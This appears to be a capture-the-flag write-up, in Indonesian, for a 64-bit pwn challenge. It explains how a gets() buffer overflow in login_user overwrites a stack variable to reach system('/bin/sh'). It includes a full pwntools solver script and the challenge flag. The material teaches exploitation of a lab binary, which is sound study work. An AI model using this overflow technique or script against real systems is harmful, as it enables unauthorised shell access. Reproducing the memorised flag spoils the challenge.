# TurboLike-Login-Portal.md
## SOLUTION 

1. Pada challenge ini kita diberikan sebuah binary file dengan arsitektur 64 bit - not stripped.

![image](https://github.com/Valcar-ies/Writeup-CTF-Foresty-Hacker-Class/assets/84186470/1b3f654d-3cf3-44ac-87e4-7e3130fd15b7)


2. Lalu saya mengecek protections yang di apply ke binary file.

> RESULT


![image](https://github.com/Valcar-ies/Writeup-CTF-Foresty-Hacker-Class/assets/84186470/b623a709-b88a-4e2e-8f61-9580b19ffac3)


3. Langsung saja kita decompile file binary untuk mengidentifikasi kerentanan.
4. Terdapat fungsi login_user yang dipanggil pada fungsi main. Pada fungsi login_user ini ditemukan kerentanan potensial untuk seragan bufferoverflow yakni pada fungsi gets().
5. Lalu ditemukan adanya pemanggilan system("/bin/sh") yang nantinya akan melakukan "spawn shell". Namun variabel local_18 harus bernilai 1, kita dapat mengubah value yang di stored pada variabel dengan melakukan bufferoverflow.

![image](https://github.com/Valcar-ies/Writeup-CTF-Foresty-Hacker-Class/assets/84186470/813e53a1-cf03-4354-85ea-8f42bb6a8247)


6. Dikarenakan buffer local_58 sebesar 64 bytes, maka dengan memasukkan exact 64 bytes tentunya akan menyebabkan bufferoverflow mengingat tidak adanya ruang untuk null terminator -> \0. Berikut adalah solver yang saya gunakan:

```py
from pwn import *
import os

os.system('clear')

def start(argv=[], *a, **kw):
    if args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  
        return process([exe] + argv, *a, **kw)

exe = './chall'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'

sh = start()

offset = 64 

p = flat([
    asm('nop') * offset,
    0x1 # 1
])

sh.sendlineafter(b':', p)
sh.interactive()
```

7. Sebelumnya kita tes dulu secara local.

![image](https://github.com/Valcar-ies/Writeup-CTF-Foresty-Hacker-Class/assets/84186470/f71c50d6-f01e-4bb2-afa4-87172edfa3e9)


8. Kita berhasil mendapatkan shell, yang berarti kita telah berhasil mengubah value dari stack variable.
9. Langsung saja kita send script untuk remote server.

![image](https://github.com/Valcar-ies/Writeup-CTF-Foresty-Hacker-Class/assets/84186470/d94e47ba-41c1-4c7a-b301-05e69e241db3)


# FLAG: ForestyHC{overwrit1ng_another_variable_on_stack_9af46a}
